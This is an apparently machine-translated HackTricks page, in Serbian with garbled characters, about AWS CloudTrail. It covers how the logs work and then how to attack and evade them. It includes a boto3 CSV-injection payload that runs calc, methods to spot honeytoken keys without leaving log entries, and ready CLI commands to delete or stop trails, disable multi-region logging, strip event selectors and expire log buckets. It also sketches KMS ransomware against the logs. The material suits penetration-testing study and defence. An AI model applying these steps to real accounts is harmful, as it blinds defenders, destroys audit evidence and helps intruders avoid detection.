# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **beleÅ¾i i prati aktivnost unutar vaÅ¡eg AWS okruÅ¾enja**. Zapisuje detaljne **logove dogaÄ‘aja**, ukljuÄujuÄ‡i ko je Å¡ta uradio, kada i odakle, za sve interakcije sa AWS resursima. Ovo pruÅ¾a trag revizije promena i akcija, pomaÅ¾uÄ‡i u analizi bezbednosti, reviziji usklaÄ‘enosti i praÄ‡enju promena resursa. CloudTrail je kljuÄan za razumevanje ponaÅ¡anja korisnika i resursa, poboljÅ¡anje bezbednosnih postura i osiguranje usklaÄ‘enosti sa propisima.

Svaki zabeleÅ¾eni dogaÄ‘aj sadrÅ¾i:

* Ime pozvane API: `eventName`
* Pozvana usluga: `eventSource`
* Vreme: `eventTime`
* IP adresa: `SourceIPAddress`
* Metoda agenta: `userAgent`. Primeri:
* Signing.amazonaws.com - Iz AWS Management Console
* console.amazonaws.com - Root korisnik naloga
* lambda.amazonaws.com - AWS Lambda
* Parametri zahteva: `requestParameters`
* Elementi odgovora: `responseElements`

DogaÄ‘aji se upisuju u novu log datoteku **otprilike svake 5 minuta u JSON datoteci**, drÅ¾e ih CloudTrail i na kraju, log datoteke se **isporuÄuju u S3 otprilike 15 minuta nakon**.\
CloudTrail logovi se mogu **agregirati izmeÄ‘u naloga i izmeÄ‘u regiona.**\
CloudTrail omoguÄ‡ava koriÅ¡Ä‡enje **integriteta log datoteka kako bi se moglo verifikovati da su vaÅ¡e log datoteke ostale nepromenjene** od trenutka kada ih je CloudTrail isporuÄio vama. Kreira SHA-256 hash logova unutar datoteke sa saÅ¾etkom. SHA-256 hash novih logova se kreira svake sat vremena.\
Kada kreirate Trail, selektori dogaÄ‘aja Ä‡e vam omoguÄ‡iti da oznaÄite trail za logovanje: upravljanje, podaci ili uvidi.

Logovi se Äuvaju u S3 kanti. Po defaultu se koristi enkripcija sa servera (SSE-S3) tako da AWS dekriptuje sadrÅ¾aj za ljude koji imaju pristup, ali za dodatnu bezbednost moÅ¾ete koristiti SSE sa KMS i svojim kljuÄevima.

Logovi se Äuvaju u **S3 kanti sa ovim formatom imena**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gde je BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Primer: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Unutar svake fascikle svaki log Ä‡e imati **ime koje prati ovaj format**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konvencija imenovanja log datoteka

![](<../../../../.gitbook/assets/image (122).png>)

Pored toga, **datoteke sa saÅ¾etkom (za proveru integriteta datoteka)** Ä‡e biti unutar **iste kante** u:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregiranje logova iz viÅ¡e naloga

* Kreirajte Trail u AWS nalogu gde Å¾elite da se log datoteke isporuÄe
* Primijenite dozvole na odrediÅ¡nu S3 kantu omoguÄ‡avajuÄ‡i pristup izmeÄ‘u naloga za CloudTrail i dozvolite svakom AWS nalogu koji treba pristup
* Kreirajte novi Trail u drugim AWS nalozima i izaberite da koristite kreiranu kantu u koraku 1

MeÄ‘utim, Äak i ako moÅ¾ete saÄuvati sve logove u istoj S3 kanti, ne moÅ¾ete agregirati CloudTrail logove iz viÅ¡e naloga u CloudWatch logove koji pripadaju jednom AWS nalogu.

{% hint style="danger" %}
Zapamtite da nalog moÅ¾e imati **razliÄite Trails** iz CloudTrail **omoguÄ‡en** koji Äuvaju iste (ili razliÄite) logove u razliÄitim kantama.
{% endhint %}

### CloudTrail iz svih org naloga u 1

Kada kreirate CloudTrail, moguÄ‡e je naznaÄiti da se aktivira cloudtrail za sve naloge u organizaciji i da se logovi dobiju u samo 1 kantu:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Na ovaj naÄin moÅ¾ete lako konfigurisati CloudTrail u svim regionima svih naloga i centralizovati logove u 1 nalogu (koji treba da zaÅ¡titite).

### Provera log datoteka

MoÅ¾ete proveriti da logovi nisu izmenjeni pokretanjem

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail moÅ¾e automatski slati logove u CloudWatch kako biste mogli postaviti upozorenja koja vas obaveÅ¡tavaju kada se izvrÅ¡e sumnjive aktivnosti.**\
Imajte na umu da je za omoguÄ‡avanje CloudTrail-u da Å¡alje logove u CloudWatch potrebno kreirati **ulogu** koja omoguÄ‡ava tu akciju. Ako je moguÄ‡e, preporuÄuje se koriÅ¡Ä‡enje AWS podrazumevane uloge za izvrÅ¡avanje ovih akcija. Ova uloga Ä‡e omoguÄ‡iti CloudTrail-u da:

* CreateLogStream: Ovo omoguÄ‡ava kreiranje CloudWatch Logs log stream-ova
* PutLogEvents: Dostavlja CloudTrail logove u CloudWatch Logs log stream

### Event History

CloudTrail Event History vam omoguÄ‡ava da pregledate u tabeli logove koji su zabeleÅ¾eni:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** automatski **analizira** write management dogaÄ‘aje iz CloudTrail tragova i **upozorava** vas na **neobiÄne aktivnosti**. Na primer, ako doÄ‘e do poveÄ‡anja `TerminateInstance` dogaÄ‘aja koji se razlikuje od utvrÄ‘enih osnovica, videÄ‡ete to kao Insight dogaÄ‘aj. Ovi dogaÄ‘aji olakÅ¡avaju **pronalazak i reagovanje na neobiÄne API aktivnosti** viÅ¡e nego ikada.

Uvidi se Äuvaju u istom bucket-u kao CloudTrail logovi u: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>Proverite da li su logovi menjani (modifikovani ili obrisani)</li><li><p>KoriÅ¡Ä‡enje digest fajlova (kreirati hash za svaki fajl)</p><ul><li>SHA-256 hashing</li><li>SHA-256 sa RSA za digitalno potpisivanje</li><li>privatni kljuÄ u vlasniÅ¡tvu Amazona</li></ul></li><li>Traje 1 sat da se kreira digest fajl (izvrÅ¡ava se svake pune sate)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>KoriÅ¡Ä‡enje IAM politika i S3 bucket politika</p><ul><li>bezbednosni tim â€”> admin pristup</li><li>auditori â€”> samo za Äitanje</li></ul></li><li>KoriÅ¡Ä‡enje SSE-S3/SSE-KMS za enkripciju logova</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>OgraniÄiti pristup brisanju sa IAM i bucket politikama</li><li>KonfiguriÅ¡ite S3 MFA brisanje</li><li>Proverite sa Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor se oslanja na poslednjih 400 dana AWS **CloudTrail logova kako bi prikupio svoje uvide**. CloudTrail beleÅ¾i istoriju AWS API poziva i povezanih dogaÄ‘aja izvrÅ¡enih u AWS nalogu. Access Advisor koristi ove podatke da **prikaÅ¾e kada su usluge poslednji put koriÅ¡Ä‡ene**. Analizom CloudTrail logova, Access Advisor moÅ¾e odrediti koje AWS usluge je IAM korisnik ili uloga koristila i kada je taj pristup izvrÅ¡en. Ovo pomaÅ¾e AWS administratorima da donesu informisane odluke o **usavrÅ¡avanju dozvola**, jer mogu identifikovati usluge koje nisu koriÅ¡Ä‡ene duÅ¾i vremenski period i potencijalno smanjiti preÅ¡iroke dozvole na osnovu stvarnih obrazaca koriÅ¡Ä‡enja.

{% hint style="success" %}
Stoga, Access Advisor obaveÅ¡tava o **nepotrebnim dozvolama koje se daju korisnicima** kako bi administrator mogao da ih ukloni
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

MoguÄ‡e je izvrÅ¡iti CVS injekciju unutar CloudTrail-a koja Ä‡e izvrÅ¡iti proizvoljan kod ako se logovi eksportuju u CSV i otvore u Excel-u.\
SledeÄ‡i kod Ä‡e generisati log unos sa loÅ¡im imenom Trail koje sadrÅ¾i payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Za viÅ¡e informacija o CSV injekcijama, pogledajte stranicu:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Za viÅ¡e informacija o ovoj specifiÄnoj tehnici, pogledajte [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **ZaobilaÅ¾enje detekcije**

### HoneyTokens **zaobilaÅ¾enje**

Honeytokens su kreirani da **otkriju eksfiltraciju osetljivih informacija**. U sluÄaju AWS-a, to su **AWS kljuÄevi Äija se upotreba prati**, ako neÅ¡to pokrene akciju sa tim kljuÄem, onda je neko morao ukrasti taj kljuÄ.

MeÄ‘utim, Honeytokens poput onih koje kreiraju [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) koriste ili prepoznatljivo ime naloga ili koriste isti AWS ID naloga za sve svoje korisnike. Stoga, ako moÅ¾ete dobiti ime naloga i/ili ID naloga bez da Cloudtrail kreira bilo kakav log, **moÅ¾ete znati da li je kljuÄ honeytoken ili ne**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) ima neka pravila za detekciju da li kljuÄ pripada [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Ako se **`canarytokens.org`** pojavljuje u imenu uloge ili se ID naloga **`534261010715`** pojavljuje u poruci o greÅ¡ci.
* TestirajuÄ‡i ih nedavno, koriste nalog **`717712589309`** i joÅ¡ uvek ima string **`canarytokens.com`** u imenu.
* Ako se **`SpaceCrab`** pojavljuje u imenu uloge u poruci o greÅ¡ci
* **SpaceSiren** koristi **uuids** za generisanje korisniÄkih imena: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Ako **ime izgleda kao nasumiÄno generisano**, postoji velika verovatnoÄ‡a da je to HoneyToken.

#### Dobijanje ID naloga iz ID kljuÄa

MoÅ¾ete dobiti **ID naloga** iz **kodiranog** unutar **pristupnog kljuÄa** kao [**objaÅ¡njeno ovde**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i proveriti ID naloga sa vaÅ¡om listom Honeytokens AWS naloga:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Ne generiÅ¡i log

Najefikasnija tehnika za ovo je zapravo jednostavna. Samo koristi kljuÄ koji si upravo pronaÅ¡ao da pristupiÅ¡ nekoj usluzi unutar svog napadaÄkog naloga. Ovo Ä‡e **CloudTrail generisati log unutar TVOG AWS naloga, a ne unutar Å¾rtve**.

Stvar je u tome da Ä‡e izlaz prikazati greÅ¡ku koja ukazuje na ID naloga i ime naloga, tako da **Ä‡eÅ¡ moÄ‡i da vidiÅ¡ da li je to Honeytoken**.

#### AWS usluge bez logova

U proÅ¡losti je bilo nekih **AWS usluga koje ne Å¡alju logove u CloudTrail** (pronaÄ‘i [listu ovde](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Neke od tih usluga Ä‡e **odgovoriti** sa **greÅ¡kom** koja sadrÅ¾i **ARN kljuÄne uloge** ako neko neovlaÅ¡Ä‡eno (honeytoken kljuÄ) pokuÅ¡a da pristupi.

Na ovaj naÄin, **napadaÄ moÅ¾e dobiti ARN kljuÄa bez aktiviranja bilo kakvog loga**. U ARN-u napadaÄ moÅ¾e videti **AWS ID naloga i ime**, lako je znati ID i imena kompanija HoneyToken-a, tako da na ovaj naÄin napadaÄ moÅ¾e identifikovati da li je token HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Napomena da su sve javne API koje su otkrivene da ne kreiraju CloudTrail logove sada ispravljene, tako da moÅ¾da treba da pronaÄ‘eÅ¡ svoje...

Za viÅ¡e informacija proveri [**original research**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Pristupanje treÄ‡oj infrastrukturi

OdreÄ‘ene AWS usluge Ä‡e **stvoriti neku infrastrukturu** kao Å¡to su **Baze podataka** ili **Kubernetes** klasteri (EKS). Korisnik **komunicira direktno sa tim uslugama** (kao Å¡to je Kubernetes API) **neÄ‡e koristiti AWS API**, tako da CloudTrail neÄ‡e moÄ‡i da vidi ovu komunikaciju.

Stoga, korisnik sa pristupom EKS-u koji je otkrio URL EKS API-ja mogao bi generisati token lokalno i **direktno komunicirati sa API uslugom bez da bude otkriven od strane Cloudtrail-a**.

ViÅ¡e informacija u:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modifikovanje CloudTrail konfiguracije

#### ObriÅ¡i tragove
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Prekinite tragove
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### OnemoguÄ‡ite viÅ¡eregionalno logovanje

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### OnemoguÄ‡ite logovanje pomoÄ‡u selektora dogaÄ‘aja

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

U prvom primeru, jedan selektor dogaÄ‘aja je dat kao JSON niz sa jednim objektom. `"ReadWriteType": "ReadOnly"` oznaÄava da **selektor dogaÄ‘aja treba da hvata samo dogaÄ‘aje koji su samo za Äitanje** (tako da CloudTrail uvidi **neÄ‡e proveravati write** dogaÄ‘aje, na primer).

MoÅ¾ete prilagoditi selektor dogaÄ‘aja na osnovu vaÅ¡ih specifiÄnih zahteva.

#### Brisanje logova putem S3 Å¾ivotnog ciklusa

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modifikovanje konfiguracije kante

* ObriÅ¡ite S3 kantu
* Promenite politiku kante da odbije bilo kakve upise iz CloudTrail servisa
* Dodajte politiku Å¾ivotnog ciklusa S3 kante za brisanje objekata
* OnemoguÄ‡ite KMS kljuÄ koji se koristi za enkripciju CloudTrail logova

### Cloudtrail ransomware

#### S3 ransomware

MoÅ¾ete **generisati asimetriÄni kljuÄ** i naterati **CloudTrail da enkriptuje podatke** tim kljuÄem i **obrisati privatni kljuÄ** tako da se sadrÅ¾aj CloudTrail-a ne moÅ¾e povratiti.\
Ovo je u suÅ¡tini **S3-KMS ransomware** objaÅ¡njeno u:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Ovo je najlakÅ¡i naÄin da se izvede prethodni napad sa razliÄitim zahtevima za dozvole:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Reference**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
